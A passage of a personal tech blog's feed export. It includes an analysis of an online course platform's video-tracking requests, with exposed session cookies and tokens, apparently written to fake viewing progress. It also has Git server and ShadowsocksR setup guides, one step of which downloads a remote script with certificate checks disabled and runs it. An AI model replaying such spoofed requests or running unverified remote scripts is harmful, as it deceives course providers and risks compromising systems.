class="token punctuation">;</span><span class="token comment" spellcheck="true">// salt = (下舍入((1+ 一个0~1间的小数随机数) * 1048576)).转换为36进制</span><span class="token keyword">var</span> pg <span class="token operator">=</span> v <span class="token operator">+</span> salt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="Event-1-Play-video"><a href="#Event-1-Play-video" class="headerlink" title="Event 1 : Play_video"></a>Event 1 : Play_video</h4><p>Base URL : <code>http://ynu.xuetangx.com/event</code><br>方式：　GET</p><p>Request Header:</p><pre><code>Accept:application/json, text/javascript, */*; q=0.01Accept-Encoding:gzip, deflateAccept-Language:en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7Content-Length:318Content-Type:application/x-www-form-urlencoded; charset=UTF-8Cookie:UM_distinctid=1601d25d955992-041780ba866e8-102c1709-1fa400-1601d25d9561182; _spoc_lms_cms_sessionid=8a1bc8065611bd8d6d347b9ae538f14f; sessionid=8a1bc8065611bd8d6d347b9ae538f14f; CNZZDATA1261596198=1201952707-1512317271-%7C1512476093; csrftoken=RrcGA18IeDhImhGwG6eDhoZbPViPyle7; user_id=7717027; _log_user_id=15490f8b4640272d3085687db3630f8aDNT:1Host:ynu.xuetangx.comOrigin:http://ynu.xuetangx.comProxy-Connection:keep-aliveReferer:http://ynu.xuetangx.com/courses/course-v1:TsinghuaX+y10_010610183_2X+2017_T2/courseware/a0c88e15f0724905bdae5001ae905a15/4a819651df914e8e944be7e00f248d35/User-Agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36X-CSRFToken:RrcGA18IeDhImhGwG6eDhoZbPViPyle7X-Requested-With:XMLHttpRequest</code></pre><p>POST Form:</p><pre><code>event_type:play_videopage:http://ynu.xuetangx.com/courses/course-v1:TsinghuaX+y10_010610183_2X+2017_T2/courseware/a0c88e15f0724905bdae5001ae905a15/4a819651df914e8e944be7e00f248d35/event:{&quot;id&quot;:&quot;6e9bf023d8cf4744b7add14a3ab932d8&quot;,&quot;code&quot;:&quot;html5&quot;,&quot;currentTime&quot;:0}</code></pre><pre><code>event_type:cdn_perfpage:http://ynu.xuetangx.com/courses/course-v1:TsinghuaX+y10_010610183_2X+2017_T2/courseware/a0c88e15f0724905bdae5001ae905a15/4a819651df914e8e944be7e00f248d35/event:{&quot;event&quot;:&quot;canplaythrough&quot;,&quot;id&quot;:&quot;6e9bf023d8cf4744b7add14a3ab932d8_16uiv&quot;,&quot;expgroup&quot;:&quot;spoc&quot;,&quot;value&quot;:111457,&quot;page&quot;:&quot;B304B0428B631CD59C33DC5901307461&quot;,&quot;count&quot;:2}</code></pre><h4 id="心跳连续打点"><a href="#心跳连续打点" class="headerlink" title="心跳连续打点"></a>心跳连续打点</h4><pre><code>et= heartbeatcp= 当前视频时间（单位秒）    //两个cp间隔= i * spts= 当前系统时间戳 (Unix Timestamp，单位ms)                      // 两个ts间隔 = 5ssq= 自增id_=时间戳                                     //同样=ts</code></pre><h2 id="播放完成"><a href="#播放完成" class="headerlink" title="播放完成"></a>播放完成</h2><h3 id="保存用户状态并暂停，同时发送event"><a href="#保存用户状态并暂停，同时发送event" class="headerlink" title="保存用户状态并暂停，同时发送event"></a>保存用户状态并暂停，同时发送event</h3><h4 id="save-user-state"><a href="#save-user-state" class="headerlink" title="save_user_state"></a>save_user_state</h4><pre><code>POST http://ynu.xuetangx.com/courses/course-v1:TsinghuaX+y10_010610183_2X+2017_T2/xblock/block-v1:TsinghuaX+y10_010610183_2X+2017_T2+type@video+block@6e9bf023d8cf4744b7add14a3ab932d8/handler/xmodule_handler/save_user_state HTTP/1.1Content-Length: 33Referer: http://ynu.xuetangx.com/courses/course-v1:TsinghuaX+y10_010610183_2X+2017_T2/courseware/a0c88e15f0724905bdae5001ae905a15/4a819651df914e8e944be7e00f248d35/</code></pre><p>FORM Data:</p><pre><code>saved_video_position:00:08:39saved_video_position=00%3A08%3A39</code></pre><p>注意几点：   </p><ol><li>Base URL: <code>http://ynu.xuetangx.com/courses/</code> +  c + <code>/xblock/block-v1:</code> + c + <code>type@video+block@</code>+ v +<code>/handler/xmodule_handler/save_user_state</code></li></ol><h4 id="Heartbeat-event-2"><a href="#Heartbeat-event-2" class="headerlink" title="( Heartbeat + event ) * 2"></a>( Heartbeat + event ) * 2</h4><h5 id="Heartbeat-GET"><a href="#Heartbeat-GET" class="headerlink" title="Heartbeat ( GET )"></a>Heartbeat ( GET )</h5><pre class="line-numbers language-javascript"><code class="language-javascript">et <span class="token punctuation">:</span> pausets <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">.</span>5s<span class="token punctuation">)</span> _ <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">.</span>5s<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="event-post"><a href="#event-post" class="headerlink" title="event (post)"></a>event (post)</h5><pre><code>event_type:pause_videopage:http://ynu.xuetangx.com/courses/course-v1:TsinghuaX+y10_010610183_2X+2017_T2/courseware/a0c88e15f0724905bdae5001ae905a15/4a819651df914e8e944be7e00f248d35/event:{&quot;id&quot;:&quot;6e9bf023d8cf4744b7add14a3ab932d8&quot;,&quot;code&quot;:&quot;html5&quot;,&quot;currentTime&quot;:519.36}</code></pre><p>id = v</p><h5 id="Heartbeat-GET-1"><a href="#Heartbeat-GET-1" class="headerlink" title="Heartbeat ( GET )"></a>Heartbeat ( GET )</h5><pre class="line-numbers language-javascript"><code class="language-javascript">et <span class="token punctuation">:</span> pausets <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token operator">+</span>15ms<span class="token punctuation">)</span> _ <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token operator">+</span>15ms<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="event-post-1"><a href="#event-post-1" class="headerlink" title="event (post)"></a>event (post)</h5><pre><code>event_type:stop_videopage:http://ynu.xuetangx.com/courses/course-v1:TsinghuaX+y10_010610183_2X+2017_T2/courseware/a0c88e15f0724905bdae5001ae905a15/4a819651df914e8e944be7e00f248d35/event:{&quot;id&quot;:&quot;6e9bf023d8cf4744b7add14a3ab932d8&quot;,&quot;code&quot;:&quot;html5&quot;,&quot;currentTime&quot;:519.36}</code></pre><h1 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h1><p>拉起 Python 3，使用 Requests 库准备动手。后续详情请查看 <a href="https://github.com/kmahyyg/proto_xuetangx" target="_blank" rel="noopener">https://github.com/kmahyyg/proto_xuetangx</a> 的 <code>MASTER</code> 分支。</p>]]></content>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> YNU </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>How to set up a Git server on Ubuntu</title>
      <link href="/2017/How-to-set-up-a-Git-server-on-Ubuntu/"/>
      <url>/2017/How-to-set-up-a-Git-server-on-Ubuntu/</url>
      <content type="html"><![CDATA[<h1 id="Prepartion"><a href="#Prepartion" class="headerlink" title="Prepartion"></a>Prepartion</h1><ol><li>Set a proper APT source</li><li>Ubuntu Xenial</li><li>Network connected and root access</li><li>Configure your firewall properly</li></ol><h1 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h1><h2 id="Install-the-dependencies"><a href="#Install-the-dependencies" class="headerlink" title="Install the dependencies"></a>Install the dependencies</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">apt-get</span> update -y<span class="token function">apt-get</span> <span class="token function">install</span> git-core git-all -y<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="Install-a-proper-SSH-key"><a href="#Install-a-proper-SSH-key" class="headerlink" title="Install a proper SSH key"></a>Install a proper SSH key</h2><pre class="line-numbers language-bash"><code class="language-bash">ssh-copy-idadduser <span class="token function">git</span><span class="token function">mkdir</span> /home/git/.ssh <span class="token operator">&amp;&amp;</span> <span class="token function">chmod</span> 700 /home/git/.ssh<span class="token function">touch</span> /home/git/.ssh/authorized_keys <span class="token operator">&amp;&amp;</span> <span class="token function">chmod</span> 600 /home/git/.ssh/authorized_keys<span class="token function">touch</span> /home/git/.ssh/authorized_keys <span class="token operator">&amp;&amp;</span> <span class="token function">cat</span> /root/.ssh/authorized_keys <span class="token operator">>></span> /home/git/.ssh/authorized_keys<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Set-up-the-repo-and-git-server"><a href="#Set-up-the-repo-and-git-server" class="headerlink" title="Set up the repo and git server"></a>Set up the repo and git server</h1><h2 id="Set-up-an-empty-repo"><a href="#Set-up-an-empty-repo" class="headerlink" title="Set up an empty repo"></a>Set up an empty repo</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /var/lib/git<span class="token function">mkdir</span> ./gitrepo<span class="token function">cd</span> ./gitrepo<span class="token function">git</span> init --bare<span class="token function">chown</span> -R git:git gitrepo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Set-up-Git-user-login-shell"><a href="#Set-up-Git-user-login-shell" class="headerlink" title="Set up Git user login shell"></a>Set up Git user login shell</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mkdir</span> /home/git/git-shell-commands<span class="token function">chmod</span> +x /home/git/git-shell-commands<span class="token function">cat</span> <span class="token operator">></span>/home/git/git-shell-commands/no-interactive-login <span class="token operator">&lt;&lt;</span>\EOF<span class="token comment" spellcheck="true">#!/bin/bash</span><span class="token function">printf</span> <span class="token string">'%s\n'</span> <span class="token string">"Hi <span class="token variable">$USER!</span> You've successfully authenticated, But We donnot provide the shell access."</span><span class="token keyword">exit</span> 128EOF<span class="token function">chmod</span> +x /home/git/git-shell-commands/no-interactive-login chsh <span class="token function">git</span> -s /home/git/git-shell-commands/no-interactive-login<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Make-sure-Git-daemon-is-running"><a href="#Make-sure-Git-daemon-is-running" class="headerlink" title="Make sure Git daemon is running"></a>Make sure Git daemon is running</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ps</span> auxrunsv /etc/service<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="Set-the-local-repo-synced-with-remote-branch"><a href="#Set-the-local-repo-synced-with-remote-branch" class="headerlink" title="Set the local repo synced with remote branch"></a>Set the local repo synced with remote branch</h1><h2 id="Set-up-local-repo"><a href="#Set-up-local-repo" class="headerlink" title="Set up local repo"></a>Set up local repo</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> remote add origin master ssh://git@<span class="token punctuation">[</span>your hostname<span class="token punctuation">]</span>:<span class="token punctuation">[</span>your <span class="token function">ssh</span> port<span class="token punctuation">]</span>/<span class="token punctuation">[</span>absolute path of the <span class="token function">git</span> repo<span class="token punctuation">]</span>/<span class="token punctuation">[</span>reponame.git<span class="token punctuation">]</span><span class="token function">git</span> fetch<span class="token function">git</span> rebase master<span class="token function">git</span> add <span class="token keyword">.</span><span class="token function">git</span> commit -m <span class="token string">"sync with upstream"</span><span class="token function">git</span> push origin master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Troubleshooting"><a href="#Troubleshooting" class="headerlink" title="Troubleshooting"></a>Troubleshooting</h1><h2 id="Troubleshooting-1"><a href="#Troubleshooting-1" class="headerlink" title="Troubleshooting"></a>Troubleshooting</h2><h3 id="cannot-create-the-lock-file"><a href="#cannot-create-the-lock-file" class="headerlink" title="cannot create the lock file"></a>cannot create the lock file</h3><p>just delete {[repo root]/refs/master/heads/master.lock}</p><h3 id="permission-denied"><a href="#permission-denied" class="headerlink" title="permission denied"></a>permission denied</h3><p>use <code>chown -R git:git [folder path]</code></p>]]></content>
      
      
        <tags>
            
            <tag> Tech </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Discrete Math</title>
      <link href="/2017/Discrete-Math/"/>
      <url>/2017/Discrete-Math/</url>
      <content type="html"><![CDATA[<h1 id="CP-规则"><a href="#CP-规则" class="headerlink" title="CP 规则"></a>CP 规则</h1><p>先说一下，即使不用CP规则，只用P规则和T规则（即直接证明法）也可以实现所有证明。引入CP规则，只是为了简化证明过程。不过CP规则的适用范围不像P、T规则那样具有普遍性——当被证明的结论本身是一个条件复合命题时，才会用到CP规则。其内容是：<br>若要证明：(S)=&gt;(R→C)；——S是前提，R→C是结论；<br>只需证明：(S∧R)=&gt;(C)；——即：把R当作附加的前提，引入推理过程；<br>具体运用方法就是：<br>（1）使用P规则，把R当作一般前提（就像S一样）来使用；但应加以说明：附加前提；<br>（2）当推导出C之后，可直接写出最后的结论：R→C；这一步的说明是：CP规则；<br>需要注意：单纯来看（2）中的这一步推理，其实从C到R→C是可以直接推出的。【C=&gt;R→C】本身就是一个重言蕴含式（也就是推理公式），在直接证明法中可直接使用T规则完成这一步的推理。但是，在这里是不行的。<br>因为，推导C的过程中我们用到了R这一前提，但这个前提不是用纯正的P规则引入的。R是作为“附加前提”引入的。可以说，C这个中间结论（以及所有借助R推出的中间结论）并不是纯正的结论。事实上，这个中间结论可能根本就是个假命题。——虽然这并不影响我们的最终推理，因为我们的目标并不是C，而是R→C，但是，这种情况在直接推理中是绝对不允许的：在直接推理中，包括中间结论在内的每一步都必须是真命题。<br>这也就是CP规则与P、T规则的区别所在。所以，在这样的推理中，必须对CP规则的使用作出说明。<br>如上所说，CP规则的使用被分成了（1）、（2）两部分。这两部分所依据的规则都与纯正的P、T规则不同，所以都应作出特殊的说明。</p>]]></content>
      
      
        <tags>
            
            <tag> School </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ShadowsocksR Installation - SS Deprecated</title>
      <link href="/2017/ShadowsocksLIBEV/"/>
      <url>/2017/ShadowsocksLIBEV/</url>
      <content type="html"><![CDATA[<h1 id="etc-sysctl-conf"><a href="#etc-sysctl-conf" class="headerlink" title="/etc/sysctl.conf"></a>/etc/sysctl.conf</h1><blockquote><p>#</p><h1 id="etc-sysctl-conf-Configuration-file-for-setting-system-variables"><a href="#etc-sysctl-conf-Configuration-file-for-setting-system-variables" class="headerlink" title="/etc/sysctl.conf - Configuration file for setting system variables"></a>/etc/sysctl.conf - Configuration file for setting system variables</h1><h1 id="See-etc-sysctl-d-for-additional-system-variables"><a href="#See-etc-sysctl-d-for-additional-system-variables" class="headerlink" title="See /etc/sysctl.d/ for additional system variables."></a>See /etc/sysctl.d/ for additional system variables.</h1><h1 id="See-sysctl-conf-5-for-information"><a href="#See-sysctl-conf-5-for-information" class="headerlink" title="See sysctl.conf (5) for information."></a>See sysctl.conf (5) for information.</h1><p>#</p><p>#kernel.domainname = example.com</p><h1 id="Uncomment-the-following-to-stop-low-level-messages-on-console"><a href="#Uncomment-the-following-to-stop-low-level-messages-on-console" class="headerlink" title="Uncomment the following to stop low-level messages on console"></a>Uncomment the following to stop low-level messages on console</h1><p>#kernel.printk = 3 4 1 3</p><p>##############################################################3</p><h1 id="Functions-previously-found-in-netbase"><a href="#Functions-previously-found-in-netbase" class="headerlink" title="Functions previously found in netbase"></a>Functions previously found in netbase</h1><p>#</p><h1 id="Uncomment-the-next-two-lines-to-enable-Spoof-protection-reverse-path-filter"><a href="#Uncomment-the-next-two-lines-to-enable-Spoof-protection-reverse-path-filter" class="headerlink" title="Uncomment the next two lines to enable Spoof protection (reverse-path filter)"></a>Uncomment the next two lines to enable Spoof protection (reverse-path filter)</h1><h1 id="Turn-on-Source-Address-Verification-in-all-interfaces-to"><a href="#Turn-on-Source-Address-Verification-in-all-interfaces-to" class="headerlink" title="Turn on Source Address Verification in all interfaces to"></a>Turn on Source Address Verification in all interfaces to</h1><h1 id="prevent-some-spoofing-attacks"><a href="#prevent-some-spoofing-attacks" class="headerlink" title="prevent some spoofing attacks"></a>prevent some spoofing attacks</h1><p>#net.ipv4.conf.default.rp_filter=1</p><p>#net.ipv4.conf.all.rp_filter=1</p><h1 id="Uncomment-the-next-line-to-enable-TCP-IP-SYN-cookies"><a href="#Uncomment-the-next-line-to-enable-TCP-IP-SYN-cookies" class="headerlink" title="Uncomment the next line to enable TCP/IP SYN cookies"></a>Uncomment the next line to enable TCP/IP SYN cookies</h1><h1 id="See-http-lwn-net-Articles-277146"><a href="#See-http-lwn-net-Articles-277146" class="headerlink" title="See http://lwn.net/Articles/277146/"></a>See <a href="http://lwn.net/Articles/277146/" target="_blank" rel="noopener">http://lwn.net/Articles/277146/</a></h1><h1 id="Note-This-may-impact-IPv6-TCP-sessions-too"><a href="#Note-This-may-impact-IPv6-TCP-sessions-too" class="headerlink" title="Note: This may impact IPv6 TCP sessions too"></a>Note: This may impact IPv6 TCP sessions too</h1><p>net.ipv4.tcp_syncookies=1</p><h1 id="Uncomment-the-next-line-to-enable-packet-forwarding-for-IPv4"><a href="#Uncomment-the-next-line-to-enable-packet-forwarding-for-IPv4" class="headerlink" title="Uncomment the next line to enable packet forwarding for IPv4"></a>Uncomment the next line to enable packet forwarding for IPv4</h1><p>net.ipv4.ip_forward=1</p><h1 id="Uncomment-the-next-line-to-enable-packet-forwarding-for-IPv6"><a href="#Uncomment-the-next-line-to-enable-packet-forwarding-for-IPv6" class="headerlink" title="Uncomment the next line to enable packet forwarding for IPv6"></a>Uncomment the next line to enable packet forwarding for IPv6</h1><h1 id="Enabling-this-option-disables-Stateless-Address-Autoconfiguration"><a href="#Enabling-this-option-disables-Stateless-Address-Autoconfiguration" class="headerlink" title="Enabling this option disables Stateless Address Autoconfiguration"></a>Enabling this option disables Stateless Address Autoconfiguration</h1><h1 id="based-on-Router-Advertisements-for-this-host"><a href="#based-on-Router-Advertisements-for-this-host" class="headerlink" title="based on Router Advertisements for this host"></a>based on Router Advertisements for this host</h1><p>net.ipv6.conf.all.forwarding=1</p><p>##################################################################</p><h1 id="Additional-settings-these-settings-can-improve-the-network"><a href="#Additional-settings-these-settings-can-improve-the-network" class="headerlink" title="Additional settings - these settings can improve the network"></a>Additional settings - these settings can improve the network</h1><h1 id="security-of-the-host-and-prevent-against-some-network-attacks"><a href="#security-of-the-host-and-prevent-against-some-network-attacks" class="headerlink" title="security of the host and prevent against some network attacks"></a>security of the host and prevent against some network attacks</h1><h1 id="including-spoofing-attacks-and-man-in-the-middle-attacks-through"><a href="#including-spoofing-attacks-and-man-in-the-middle-attacks-through" class="headerlink" title="including spoofing attacks and man in the middle attacks through"></a>including spoofing attacks and man in the middle attacks through</h1><h1 id="redirection-Some-network-environments-however-require-that-these"><a href="#redirection-Some-network-environments-however-require-that-these" class="headerlink" title="redirection. Some network environments, however, require that these"></a>redirection. Some network environments, however, require that these</h1><h1 id="settings-are-disabled-so-review-and-enable-them-as-needed"><a href="#settings-are-disabled-so-review-and-enable-them-as-needed" class="headerlink" title="settings are disabled so review and enable them as needed."></a>settings are disabled so review and enable them as needed.</h1><p>#</p><h1 id="Do-not-accept-ICMP-redirects-prevent-MITM-attacks"><a href="#Do-not-accept-ICMP-redirects-prevent-MITM-attacks" class="headerlink" title="Do not accept ICMP redirects (prevent MITM attacks)"></a>Do not accept ICMP redirects (prevent MITM attacks)</h1><p>net.ipv4.conf.all.accept_redirects = 0<br>net.ipv6.conf.all.accept_redirects = 0</p><h1 id="or"><a href="#or" class="headerlink" title="_or_"></a>_or_</h1><h1 id="Accept-ICMP-redirects-only-for-gateways-listed-in-our-default"><a href="#Accept-ICMP-redirects-only-for-gateways-listed-in-our-default" class="headerlink" title="Accept ICMP redirects only for gateways listed in our default"></a>Accept ICMP redirects only for gateways listed in our default</h1><h1 id="gateway-list-enabled-by-default"><a href="#gateway-list-enabled-by-default" class="headerlink" title="gateway list (enabled by default)"></a>gateway list (enabled by default)</h1><h1 id="net-ipv4-conf-all-secure-redirects-1"><a href="#net-ipv4-conf-all-secure-redirects-1" class="headerlink" title="net.ipv4.conf.all.secure_redirects = 1"></a>net.ipv4.conf.all.secure_redirects = 1</h1><p>#</p><h1 id="Do-not-send-ICMP-redirects-we-are-not-a-router"><a href="#Do-not-send-ICMP-redirects-we-are-not-a-router" class="headerlink" title="Do not send ICMP redirects (we are not a router)"></a>Do not send ICMP redirects (we are not a router)</h1><p>net.ipv4.conf.all.send_redirects = 0<br>#</p><h1 id="Do-not-accept-IP-source-route-packets-we-are-not-a-router"><a href="#Do-not-accept-IP-source-route-packets-we-are-not-a-router" class="headerlink" title="Do not accept IP source route packets (we are not a router)"></a>Do not accept IP source route packets (we are not a router)</h1><p>net.ipv4.conf.all.accept_source_route = 0<br>net.ipv6.conf.all.accept_source_route = 0<br>#</p><h1 id="Log-Martian-Packets"><a href="#Log-Martian-Packets" class="headerlink" title="Log Martian Packets"></a>Log Martian Packets</h1><p>#net.ipv4.conf.all.log_martians = 1<br>#</p><p>#net.netfilter.nf_conntrack_max = 64000</p><p>#net.nf_conntrack_max = 64000</p><p>#fs.file-max = 51200</p><p>#net.core.rmem_max = 67108864</p><p>#net.core.wmem_max = 67108864</p><p>#net.core.rmem_default = 65536</p><p>#net.core.wmem_default = 65536</p><p>#net.core.netdev_max_backlog = 4096<br>net.core.somaxconn = 4096</p><p>#net.ipv4.tcp_tw_reuse = 1</p><p>#net.ipv4.tcp_tw_recycle = 0</p><p>#net.ipv4.tcp_fin_timeout = 30</p><p>#net.ipv4.tcp_keepalive_time = 1200</p><p>#net.ipv4.ip_local_port_range = 10000 65000</p><p>#net.ipv4.tcp_max_syn_backlog = 4096</p><p>#net.ipv4.tcp_max_tw_buckets = 5000</p><p>#net.ipv4.tcp_fastopen = 3</p><p>#net.ipv4.tcp_rmem = 4096 87380 67108864</p><p>#net.ipv4.tcp_wmem = 4096 65536 67108864</p><p>#net.ipv4.tcp_mtu_probing = 1</p><p>#net.ipv4.tcp_congestion_control = cubic</p></blockquote><h1 id="Newly-updated-tutorial-for-SSR"><a href="#Newly-updated-tutorial-for-SSR" class="headerlink" title="Newly updated tutorial for SSR"></a>Newly updated tutorial for SSR</h1><p>Updated : 2017-09-24 11:29:39</p><pre class="line-numbers language-#!/bin/bash```"><code class="language-#!/bin/bash```"># initializedps auxcd /etc/sshvi ./sshd_configservice sshd  restartapt-get update -yapt-get upgrade -yapt-get install python3 python python-pip python3-pip unzip cmake make gcc build-essential -yapt-get install ca-certificates -yclearmkdir ./tempinscd ./tempinswget https://github.com/jedisct1/libsodium/releases/download/1.0.14/libsodium-1.0.14.tar.gzwget https://github.com/ARMmbed/mbedtls/archive/mbedtls-2.6.0.tar.gzwget https://www.openssl.org/source/openssl-1.0.2l.tar.gztar zxvf ./mbedtls-2.6.0.tar.gztar zxvf ./openssl-1.0.2l.tar.gz tar zxf ./libsodium-1.0.14.tar.gz # mbedtls installationmakemake testmake installcd ..# libsodium installationcd ./libsodium-1.0.14/apt-get install libtool autoconf -y./autogen.sh ./configure makemake installpopdldconfigcd ..# openssl configure and installcd ./openssl-1.0.2l/apt-get install python-m2crypto -y./config --openssldir=/usr/local/sslmakemake test && make install# git clone repocd /rootapt-get install git vim -ygit clone https://github.com/fuckwall-bak/shadowsocksr ./ssrifconfig -a./initmudbjson.shcat ./mudb.jsonvi /etc/sysctl.confsysctl -psystemctl status rc.local# make it bootloadedcd /etcvi ./rc.local# don't forget to setup iptables```# Generated by iptables-save v1.4.21 on Sun Sep 24 10:40:01 2017<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-*filter"><code class="language-*filter">:INPUT ACCEPT [227:16048]:FORWARD ACCEPT [0:0]:OUTPUT ACCEPT [151:15188]-A INPUT -p tcp -m multiport --dports 24,22,50,57,105,106,158,209,1109,24554,60177,60179 -m state --state NEW,ESTABLISHED -j DROP-A OUTPUT -p tcp -m multiport --dports 25,26,465,587 -m state --state NEW,ESTABLISHED -j REJECT --reject-with icmp-port-unreachable-A OUTPUT -p tcp -m multiport --dports 109,110,995 -m state --state NEW,ESTABLISHED -j REJECT --reject-with icmp-port-unreachable-A OUTPUT -p tcp -m multiport --dports 143,218,220,993 -m state --state NEW,ESTABLISHED -j REJECT --reject-with icmp-port-unreachable-A OUTPUT -p tcp -m multiport --dports 24,22,50,57,105,106,158,209,1109,24554,60177,60179 -m state --state NEW,ESTABLISHED -j REJECT --reject-with icmp-port-unreachableCOMMIT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code># Completed on Sun Sep 24 10:40:01 2017</code><br><code># Generated by iptables-save v1.4.21 on Sun Sep 24 10:40:01 2017</code></p><pre class="line-numbers language-*mangle"><code class="language-*mangle">:PREROUTING ACCEPT [1098:82136]:INPUT ACCEPT [1098:82136]:FORWARD ACCEPT [0:0]:OUTPUT ACCEPT [866:110116]:POSTROUTING ACCEPT [866:110116]-A OUTPUT -m string --string "torrent" --algo bm --to 65535 -j DROP-A OUTPUT -m string --string ".torrent" --algo bm --to 65535 -j DROP-A OUTPUT -m string --string "peer_id=" --algo bm --to 65535 -j DROP-A OUTPUT -m string --string "announce" --algo bm --to 65535 -j DROP-A OUTPUT -m string --string "info_hash" --algo bm --to 65535 -j DROP-A OUTPUT -m string --string "get_peers" --algo bm --to 65535 -j DROP-A OUTPUT -m string --string "find_node" --algo bm --to 65535 -j DROP-A OUTPUT -m string --string "BitTorrent" --algo bm --to 65535 -j DROP-A OUTPUT -m string --string "announce_peer" --algo bm --to 65535 -j DROP-A OUTPUT -m string --string "BitTorrent protocol" --algo bm --to 65535 -j DROP-A OUTPUT -m string --string "announce.php?passkey=" --algo bm --to 65535 -j DROP-A OUTPUT -m string --string "magnet:" --algo bm --to 65535 -j DROPCOMMIT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code># Completed on Sun Sep 24 10:40:01 2017</code></p><h1 id="don’t-forget-to-optimize-kernal-args"><a href="#don’t-forget-to-optimize-kernal-args" class="headerlink" title="don’t forget to optimize kernal args"></a>don’t forget to optimize kernal args</h1><p>net.ipv4.tcp_fastopen = 3<br>net.ipv4.ip_forward = 1<br>net.ipv4.conf.all.accept_redirects = 0<br>net.ipv6.conf.all.accept_redirects = 0<br>net.ipv4.conf.all.send_redirects = 0<br>net.ipv4.conf.all.accept_source_route = 0<br>vm.swappiness = 0<br>net.ipv4.neigh.default.gc_stale_time = 120<br>net.ipv4.conf.all.rp_filter = 0<br>net.ipv4.conf.default.rp_filter = 0<br>net.ipv4.conf.default.arp_announce = 2<br>net.ipv4.conf.lo.arp_announce = 2<br>net.ipv4.conf.all.arp_announce = 2<br>net.ipv4.tcp_max_tw_buckets = 5000<br>fs.file-max = 51200<br>net.core.rmem_max = 67108864<br>net.core.wmem_max = 67108864<br>net.core.rmem_default = 65536<br>net.core.wmem_default = 65536<br>net.core.netdev_max_backlog = 4096<br>net.core.somaxconn = 4096<br>net.ipv4.tcp_tw_reuse = 1<br>net.ipv4.tcp_mtu_probing = 1<br>net.ipv4.tcp_max_tw_buckets = 5000<br>net.ipv4.tcp_fin_timeout = 30<br>net.ipv4.tcp_keepalive_time = 1200<br>net.ipv4.tcp_syncookies = 1<br>net.ipv4.tcp_max_syn_backlog = 4096<br>net.ipv4.tcp_synack_retries = 2<br>net.ipv6.conf.all.disable_ipv6 = 1<br>net.ipv6.conf.default.disable_ipv6 = 1<br>net.ipv6.conf.lo.disable_ipv6 = 1<br>net.core.default_qdisc = fq<br>net.ipv4.tcp_congestion_control = bbr</p><h1 id="don’t-forget-install-bbr-and-the-latest-kernel"><a href="#don’t-forget-install-bbr-and-the-latest-kernel" class="headerlink" title="don’t forget install bbr and the latest kernel"></a>don’t forget install bbr and the latest kernel</h1><p>wget –no-check-certificate <a href="https://github.com/teddysun/across/raw/master/bbr.sh" target="_blank" rel="noopener">https://github.com/teddysun/across/raw/master/bbr.sh</a><br>chmod +x bbr.sh<br>./bbr.sh</p><h1 id="after-that-upload-my-own-mudb-json"><a href="#after-that-upload-my-own-mudb-json" class="headerlink" title="after that , upload my own mudb.json"></a>after that , upload my own mudb.json</h1><p>or try <code>python mujson_mgr.py -h</code> to get more help about adding users using cli instead of writing json directly.</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>Git Advanced Usage</title>
      <link href="/2017/Git-Advanced-Usage/"/>
      <url>/2017/Git-Advanced-Usage/</url>
